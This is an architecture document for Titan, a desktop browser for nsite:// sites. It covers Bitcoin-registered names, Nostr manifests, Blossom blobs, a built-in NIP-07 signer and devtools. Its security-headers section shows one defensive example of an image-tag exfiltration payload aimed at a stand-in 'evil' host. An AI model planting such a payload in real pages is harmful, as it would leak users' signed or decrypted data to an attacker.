# Titan Architecture

## Overview

Titan is a native desktop browser for the `nsite://` protocol. It resolves human-readable names registered on Bitcoin to websites hosted on Nostr relays and Blossom servers. No DNS, no certificates, no traditional hosting.

```
┌─────────────────────────────────────────────────────────┐
│                     Titan Browser                       │
│                   (Rust + Tauri 2)                       │
│                                                         │
│  Address Bar ──→ Name Resolution ──→ Manifest Fetch     │
│                        │                    │           │
│                  ┌─────┴─────┐        ┌─────┴─────┐     │
│                  │  Nostr    │        │  Nostr    │     │
│                  │  Index    │        │  Manifest │     │
│                  │ (k35129)  │        │(k15128/   │     │
│                  │           │        │  k35128)  │     │
│                  └───────────┘        └─────┬─────┘     │
│                                             │           │
│                                       ┌─────┴─────┐     │
│                                       │  Blossom  │     │
│                                       │  Servers  │     │
│                                       └─────┬─────┘     │
│                                             │           │
│                                       ┌─────┴─────┐     │
│                                       │  Webview  │     │
│                                       │  Render   │     │
│                                       └───────────┘     │
└─────────────────────────────────────────────────────────┘
```

The browser has no local database. All name resolution happens via Nostr relays.

## Components

### 1. Titan Browser (`crates/titan-app`)

Native desktop app built with Rust and Tauri 2. Uses the system webview for rendering.

**Responsibilities:**
- Parse `nsite://` URLs (names, npubs, hex pubkeys)
- Resolve names to pubkeys via Nostr index (kind 35129)
- Fetch site manifests from Nostr relays
- Fetch content blobs from Blossom servers
- Render HTML/CSS/JS in the webview
- Intercept `nsite://` link clicks within rendered pages

**Key files:**
- `src/main.rs` — Tauri app, tab management, `navigate` command, `nsite-content://` protocol handler, webview factory
- `ui/chrome.html` — Browser chrome (tab strip, address bar, nav buttons, side panels)
- `ui/chrome.js` — Tab management, navigation, bookmarks, settings, dev console
- `ui/chrome.css` — Titan moon theme (black + smokey amber)

**No local state.** No SQLite, no Bitcoin Core dependency. The browser is a pure Nostr + Blossom client.

### 2. Resolver (`crates/titan-resolver`)

Handles all Nostr relay queries and Blossom blob fetching.

**Modules:**
- `relay.rs` — Relay pool, race-then-linger search, manifest fetching, NSIT name lookup (kind 35129)
- `manifest.rs` — NIP-5A manifest parsing (v2 kind 15128/35128 + v1 kind 34128 fallback)
- `blossom.rs` — SHA256-verified blob downloading from Blossom servers
- `cache.rs` — Disk cache with TTLs (blobs forever, manifests 5min, relay lists 1hr)
- `lib.rs` — Top-level `Resolver` with `lookup_name()` and `resolve()` APIs

### 3. Bitcoin Module (`crates/titan-bitcoin`)

OP_RETURN codec, block scanner, and transaction builder. Used by the nsit-indexer service (not the browser).

**Modules:**
- `codec.rs` — NSIT wire format encode/decode
- `store.rs` — SQLite name index (used by the indexer service)
- `indexer.rs` — Block scanner with reorg detection
- `rpc.rs` — Bitcoin Core JSON-RPC client
- `tx.rs` — Transaction builder for name registration/transfer

### 4. Types (`crates/titan-types`)

Shared types: `TitanName`, `TitanOp`, `OpAction`, `NsiteUrl`, error types.

### 5. NSIT Indexer Service (`westernbtc-monorepo/services/nsit-indexer`)

Kubernetes service that watches Bitcoin blocks and publishes the name index as Nostr events. This is the bridge between Bitcoin and Nostr — browsers never touch Bitcoin directly.

**Architecture:**
```
Bitcoin Core (k8s) ──→ nsit-indexer ──→ Nostr Relays ──→ Titan Browser
     8332/TCP              │                                    │
                     ┌─────┴─────┐                        ┌────┴────┐
                     │ Kind 35129│  Name records           │ Query   │
                     │ Kind 15129│  Index stats            │ k35129  │
                     └───────────┘                        └─────────┘
```

**How it works:**
1. Connects to Bitcoin Core via k8s service DNS
2. Connects to Nostr relays
3. On startup: fetches its own last published stats (kind 15129) to resume from last synced height
4. Fetches its own published name records (kind 35129) to rebuild the in-memory registry
5. Scans new blocks for NSIT OP_RETURN outputs
6. Publishes kind 35129 for each registration/transfer (addressable, d=name)
7. Publishes kind 15129 stats after each sync
8. Polls every 30 seconds

**Files:**
- `src/index.ts` — Entry point, config, poll loop
- `src/lib/codec.ts` — NSIT OP_RETURN decoder (TypeScript port of Rust codec)
- `src/lib/rpc.ts` — Bitcoin Core JSON-RPC client
- `src/lib/scanner.ts` — Block scanner, name registry, transfer verification
- `src/lib/publisher.ts` — Nostr event publisher with ensureConnected pattern

### 6. Titan nsite (`westernbtc-monorepo/apps/titan-nsite`)

Static website published as `nsite://titan`. The browser's default homepage.

**What it does:**
- Name lookup via Nostr (queries kind 35129 from the indexer, race-then-linger)
- Index stats via Nostr (queries kind 15129)
- Interactive bitcoin-cli command builder for registration and transfer
- Name browser, name details with history, my-names by pubkey

**Published as:**
- Kind 35128 manifest with `d=titan` (for `nsite://titan`)
- Kind 15128 root manifest (for direct npub access)
- Blobs on `blossom.westernbtc.com`

**Pages:**
- `/` — Name search + stats
- `/register` — Interactive registration walkthrough (bitcoin-cli steps)
- `/transfer` — Interactive transfer walkthrough
- `/browse` — Browse all registered names
- `/name` — Name details + history (kind 1129)
- `/my-names` — Names by pubkey
- `/guide` — Full documentation

**Key files:**
- `lib/nostr.ts` — NDK client with race-then-linger search
- `lib/codec.ts` — NSIT OP_RETURN encoder + npub decoder
- `scripts/publish-v2.mjs` — nsite v2 publisher

## Resolution Flow

### Name Resolution (two tiers)

```
User types: nsite://titan
     │
     ▼
1. Sync parse (instant)
   ├─ npub1...  → bech32 decode → pubkey
   ├─ 64-char hex → pubkey
   └─ base36 (50 chars + name) → pubkey + site name
     │
     │ (not a direct pubkey — must be a name)
     ▼
2. Nostr index lookup (~1 second)
   Query: kind=35129, d="titan", author=indexer_pubkey
   Pattern: race-then-linger (first relay + 200ms)
   Result: pubkey from "p" tag
     │
     │ (if not found)
     ▼
3. Not registered → error
```

### Content Resolution

```
pubkey + site_name + path
     │
     ▼
Relay Discovery (kind 10002)
   → Add the pubkey's preferred relays to the pool
     │
     ▼
Manifest Fetch
   ├─ Name: kind 35128 (d=site_name) → v2 manifest
   ├─ npub: kind 15128 (root) → v2 manifest
   └─ Fallback: kind 34128 (v1 per-file events) → assembled manifest
     │
     ▼
Path Resolution
   manifest.resolve_path("/blog/post.html")
   → SHA256 hash from path tags
     │
     ▼
Blob Fetch (SHA256-verified)
   1. Check disk cache (blobs cached forever)
   2. Try manifest's server tags
   3. Try pubkey's kind 10063 Blossom server list
   4. Try fallback servers (blossom.westernbtc.com)
   5. Verify SHA256 hash matches
     │
     ▼
Render in webview via nsite-content:// protocol
```

### Sub-resource Loading

When the webview renders HTML that references CSS, JS, images:

```
<link href="/assets/style.css">
     │
     ▼
Webview requests: nsite-content://{pubkey_hex}.{site_name}/assets/style.css
     │
     ▼
Tauri protocol handler intercepts
     │
     ▼
Parses pubkey + site_name from the URL host
     │
     ▼
Same manifest → blob pipeline (cached manifest, fast)
```

All sub-resource requests run concurrently. Site identity is encoded in the URL host, not shared state.

## Race-Then-Linger Search

All Nostr queries use this pattern:

```
Subscribe to filter across all relays
     │
     ▼
Wait for first event (up to 10 seconds)
     │
     ▼
First event received → start 200ms linger timer
     │
     ▼
Collect any additional events within 200ms
     │
     ▼
Return newest event by created_at
```

Used for: name lookups, relay lists, manifests, Blossom server lists.

## Nostr Event Kinds

| Kind | Type | Publisher | Purpose |
|------|------|-----------|---------|
| 10002 | Replaceable | Site owner | Relay list (NIP-65) |
| 10063 | Replaceable | Site owner | Blossom server list |
| 15128 | Replaceable | Site owner | Root site manifest (NIP-5A v2) |
| 15129 | Replaceable | Indexer service | NSIT index stats |
| 24242 | Ephemeral | Any uploader | Blossom upload auth (BUD-01) |
| 34128 | Addressable | Site owner | Per-file event (nsite v1, legacy) |
| 35128 | Addressable | Site owner | Named site manifest (NIP-5A v2, d=name) |
| 1129 | Regular | Indexer service | NSIT name history (one per action, non-replaceable) |
| 35129 | Addressable | Indexer service | NSIT name record (d=name) |

## Bitcoin Name Protocol (NSIT)

### Wire Format

```
Offset  Size  Field       Description
0       4     magic       "NSIT" (0x4E534954)
4       1     version     0x01
5       1     action      0x00=register, 0x01=transfer
6       1     name_len    1-41
7       N     name        [a-z0-9-]
7+N     32    pubkey      x-only Schnorr pubkey
```

Total: 39 + N bytes. Maximum 80 bytes (OP_RETURN limit).

### Rules
- First-in-chain wins (same block: lower tx index wins)
- UTXO-based ownership: first non-OP_RETURN output = ownership UTXO
- Transfer requires spending the ownership UTXO; new ownership UTXO = first non-OP_RETURN output of transfer tx
- If ownership UTXO is spent without NSIT OP_RETURN, name is permanently frozen
- Names: lowercase, 1-41 chars, no leading/trailing/consecutive hyphens

### Registration Flow
```
User → nsite://titan/register → generates OP_RETURN hex + bitcoin-cli commands
User → bitcoin-cli → create, fund, sign, broadcast transaction
  → First non-OP_RETURN output becomes ownership UTXO
Bitcoin network → confirmation
nsit-indexer → scans block → publishes kind 35129 event
Titan browser → queries kind 35129 → name resolves
```

### Transfer Flow
```
User → nsite://titan/transfer → generates transfer OP_RETURN hex + bitcoin-cli commands
User → bitcoin-cli: spend ownership UTXO + include OP_RETURN → broadcast
  → First non-OP_RETURN output becomes new ownership UTXO
nsit-indexer → verifies UTXO spend → publishes updated kind 35129
```

## Caching

| Layer | Duration | Rationale |
|-------|----------|-----------|
| Name index | Via Nostr events | Replaceable, always fresh from relays |
| Relay list (kind 10002) | 1 hour | Changes infrequently |
| Manifest (kind 15128/35128) | 5 minutes | Updated on site deploy |
| Blobs | Forever | Content-addressed (SHA256), immutable |
| Blossom server list (kind 10063) | 1 hour | Rarely changes |

## Built-in Signer (NIP-07)

Titan ships with a built-in Nostr signer so every nsite gets a working
`window.nostr` with no external extensions.

### Components

- **`signer.rs`** — `Signer` with `NotConfigured` / `Locked` / `Unlocked`
  states. Storage backed by the OS keychain (`keyring` crate). The nsec
  never leaves the Rust process.
- **`nip07.rs`** — NIP-07 method dispatcher. Handles `getPublicKey`,
  `signEvent`, `getRelays`, `nip04.encrypt`/`decrypt`,
  `nip44.encrypt`/`decrypt`. Events are signed with nostr-sdk's
  `EventBuilder` and self-verified before return.
- **`permissions.rs`** — Per-site, per-method approval storage.
  Scopes: `AllowOnce`, `AllowSession`, `AllowAlways`, `DenyAlways`.
  `AllowAlways`/`DenyAlways` persist to `data_dir/permissions.json`.
  Session scope is cleared on lock.
- **`prompt_queue.rs`** — Pending approval request queue with
  `tokio::sync::oneshot` channels. The dispatcher pushes a request,
  awaits the response (or a 60s timeout), and the chrome resolves it
  through a Tauri command. Capped at **16 pending per site** and
  **128 global**; overflow auto-denies without prompting to block
  memory-exhaustion DoS from a hostile nsite firing requests while
  the user is AFK.
- **`audit_log.rs`** — In-memory ring buffer (200 entries, newest-first)
  of every signer decision. Outcomes tracked: `Approved`, `Denied`,
  `AutoDenied`, `SignerLocked`, `TimedOut`, `Failed`. Not persisted —
  cleared on restart. Viewable in the signer panel.

### Request flow

```
content page
  window.nostr.signEvent({...})
       │
       ▼ (fetch)
  titan-nostr://rpc   [Tauri async protocol handler]
       │
       ▼
  UriSchemeContext gives us the source webview label
       │
       ▼
  look up that tab's display_url → "site" = first path segment
       │
       ▼
  nip07::dispatch(signer, permissions, queue, app, site, request)
       │
       ├─ signer locked? → return error
       ├─ method non-sensitive? → execute immediately
       ├─ permissions.check(site, method) → Allow → execute
       ├─ permissions.check → Deny → return error
       └─ permissions.check → NeedApproval →
            queue.push(request) → emit "signer-prompt"
            await response (60s timeout)
            chrome shows modal, user picks approve/deny + scope
            chrome calls signer_resolve_prompt(id, approved, scope)
            permissions.record(site, method, scope) if approved
            execute (if approved) or return error (if denied)
```

The site origin is derived from our own tab state, **not** from anything
the content page could self-report. A site cannot spoof another site's
permissions.

### window.nostr injection

Injected into every content webview via `initialization_script` so
`window.nostr` is available synchronously before any page scripts run.
Calls `fetch('titan-nostr://rpc', { method: 'POST', body: JSON })` and
awaits the response. The response is a `{id, result}` or `{id, error}`
JSON object.

### Content webview security headers

Every `nsite-content://` response ships with a strict set of defense-
in-depth headers to keep a compromised or hostile nsite from
exfiltrating signer-approved data:

- **Content-Security-Policy** — `connect-src 'self' titan-nostr:` is the
  critical line. It blocks all outbound fetch/XHR/WebSocket except back
  to our own signer bridge, so a malicious nsite cannot ship an
  approved event or decrypted plaintext to an attacker server.
  `script-src 'self' 'unsafe-inline' 'unsafe-eval'` preserves compat
  with bundled sites but blocks external script tags. `img-src 'self'
  data: blob:` prevents `<img src="https://evil/?data=X">` exfil.
- **X-Content-Type-Options: nosniff** — prevents MIME sniffing, so a
  nsite cannot label HTML as PNG and have the browser execute it.
- **Referrer-Policy: no-referrer** — outbound clicks to mempool.space,
  relays, etc. don't leak the nsite pubkey/host in the Referer header.
- **Permissions-Policy** — disables camera, microphone, geolocation,
  payment, USB, sensors, and other powerful APIs by default.
- **X-Frame-Options: SAMEORIGIN** — legacy clickjacking defense.

All headers are applied by `apply_nsite_content_headers()` in
`main.rs`, centralized so new response paths can't accidentally skip
them.

### Windows WebView2 workaround

WebView2 (used on Windows) does not support custom URI schemes the way
WKWebView (macOS) and WebKitGTK (Linux) do. wry works around this by
rewriting `nsite-content://host/path` to `http://nsite-content.host/path`
at webview creation time and registering an `http` filter. The problem:
this rewrite only happens once. Subsequent `webview.navigate()` calls
with a raw `nsite-content://` URL silently fail and leave a blank page.

Titan's fix: a `platform_navigate_url()` helper that performs the same
rewrite on every navigate call on Windows (no-op on other platforms).
All four navigation call sites in `main.rs` run through this helper,
and the `on_navigation` allowlist accepts both `nsite-content://` and
`http://nsite-content.*`. The address bar display logic in
`content_url_to_display()` strips the `nsite-content.` prefix so users
see the original URL.

## Developer Tools (Phase 11, v0.1.7)

The dev console panel has three tabs driven by a common side-panel
infrastructure that's also used by the bookmarks, settings, signer,
and info panels.

### Tab structure

```
#panel-console
├── #devtools-tabs              (horizontal tab strip + Clear button)
├── #devtools-tab-logs          (existing Rust tracing + REPL)
├── #devtools-tab-network       (captured requests table + detail pane)
└── #devtools-tab-application   (localStorage / sessionStorage / cookies)
```

Switching tabs toggles visibility of the three tab bodies. Each tab
registers its own clear handler (logs clears `#console-log`, network
clears the ring buffer, application refreshes from the content
webview) and the single Clear button dispatches to whichever is active.

### Network capture

Two capture paths feed a single ring buffer
(`crates/titan-app/src/devtools.rs`):

- **Rust-side**: the `nsite-content://` and `titan-nostr://` async
  protocol handlers time their responses and push a
  `devtools::NetworkEvent` into `DevtoolsState` at every return branch
  (including error paths). These have `source: "rust"`.
- **JS-side**: the `on_page_load` eval block injects wrappers around
  `window.fetch`, `XMLHttpRequest`, and `WebSocket`. When a wrapped
  request completes, the wrapper builds a JSON event and clicks a
  synthetic anchor at `titan-cmd://net-event/<encoded-json>`. The
  navigation handler intercepts the `titan-cmd` scheme, parses the
  payload via `devtools::parse_js_event`, and pushes into the same
  ring buffer. These have `source: "js"`.

The ring buffer is capped at 500 events (`MAX_NETWORK_EVENTS`) to
bound memory on long-running sessions. Recording can be toggled off
from the UI; when off, new events are dropped on the floor but the
buffer is not cleared.

After every insert, the Rust side emits a `devtools-network-updated`
Tauri event. The chrome-side network tab coalesces these via
`requestAnimationFrame` so rapid bursts (40 requests on a page load)
become a single repaint.

**Response bodies are not captured.** Cloning every response would
double memory for each request, and Titan doesn't have a UX for large
body previews yet. Users who want to see a response can `await
fetch(...).then(r => r.text())` from the REPL.

**Resource load tracking is partial.** `<img>`, `<link>`, `<script>`,
and `<iframe>` loads bypass the JS wrappers (they're not fetch
calls), so they only show up if they happen to be served through
`nsite-content://` — which is the common case for nsite subresources.
External resources loaded via HTML tags won't appear in the network
tab in v1.

### Copy as cURL

The "Copy as cURL" button on a row detail calls
`helpers.js::buildCurlCommand(event)` which walks the captured event
and produces a copy-pasteable command. It uses `shellQuote` to wrap
unsafe values in single quotes and handles embedded single quotes via
the classic `'\''` escape. `content-length` headers are stripped
because curl computes them itself. Captured in Node-runnable unit
tests at `ui/helpers.test.js`.

### Application tab

Browser devtools typically have direct access to the content page's
storage. Titan's chrome is a separate webview from the content, so
we read storage by eval'ing a small JS reader in the content webview
that serializes `localStorage`, `sessionStorage`, and `document.cookie`
into a JSON payload and reports back via `titan-cmd://devtools-storage/`.

Mutations (delete a key, clear all) also go through `webview.eval()`
for symmetry. After a mutation the UI waits 50ms and re-reads — the
round-trip latency is acceptable for interactive use and lets us
avoid maintaining a separate read/write channel.

### Log filtering

The Logs tab has two filters: a minimum level dropdown (All / Debug+ /
Info+ / Warn+ / Errors) and a substring match against the Rust target
(e.g. "titan_resolver"). Default is Info+, which hides the cache and
resolver trace spam that shows up when `RUST_LOG=titan=debug` is set.

Filtering is done purely at the DOM level. Each log entry carries
`data-level` and `data-target` attributes, and the filter functions
toggle a `log-hidden` class. Changing the filter re-runs through
existing entries without re-rendering.

Auto-scroll is sticky-aware: new log lines scroll into view only if
the user was already at the bottom. If they scrolled up to read
something, new entries don't yank them back down.

### Side panel resize

The side panel is fixed-positioned on the right edge of the window
with its width driven by a CSS custom property `--panel-width`. A 6px
drag handle on the left edge (`#side-panel-resize`) captures
mousedown, attaches document-level mousemove and mouseup listeners,
and updates `--panel-width` live as the user drags.

The content webview is a separate native layer, not part of the
chrome DOM, so resizing it requires an IPC round trip via the
existing `resize_content` command. The drag handler throttles this
via `requestAnimationFrame` so the Rust side isn't hammered at 60+ Hz.

On mouseup, the final width is persisted via a dedicated
`update_side_panel_width` command. This is separate from the generic
`update_settings` to avoid races with concurrent Settings panel edits
(which load the whole Settings struct, mutate it, and save it back).

The width is clamped to [280px, 1400px] at both the Rust save path
(so a hand-edited `settings.json` can't render the panel unusable)
and the JS drag handler (so mouse excursions past the window edge
don't shrink the content to nothing).

## Infrastructure

### k8s Cluster
```
┌─────────────────────────────────────────────┐
│  cicd namespace                              │
│                                              │
│  nsit-indexer ──→ bitcoin-rpc (8332)         │
│       │                                      │
│       └──→ westernbtc-relay-service (7777)   │
│       └──→ relay.primal.net (443)            │
│       └──→ relay.damus.io (443)              │
│                                              │
│  westernbtc-blossom-server                   │
│  westernbtc-relay                            │
│  btc-nostrary                                │
│  ...                                         │
└─────────────────────────────────────────────┘

┌─────────────────────────────────────────────┐
│  Bitcoin Node (10.43.128.100)                │
│                                              │
│  bitcoind (RPC 8332, P2P 8333, ZMQ 28332)   │
│  lnd (REST 8080, gRPC 10009)                 │
└─────────────────────────────────────────────┘
```

## nsite Versions

| | v1 (nsite-cli) | v2 (NIP-5A) |
|---|---|---|
| Kind | 34128 | 15128 (root) / 35128 (named) |
| Model | One event per file | Single manifest event |
| Path | d-tag = relative path | `["path", "/abs/path", "sha256"]` tags |
| Hash | x or sha256 tag | Third element of path tag |

Titan supports both. v2 is preferred, v1 is a fallback.

## Registered Names

| Name | Pubkey | Block | Txid |
|------|--------|-------|------|
| titan | bec1a370...5cde44 | 943619 | 322ab880...e7002f |
| bitcoin | bec1a370...5cde44 | 943978 | 673af03f...609155 |
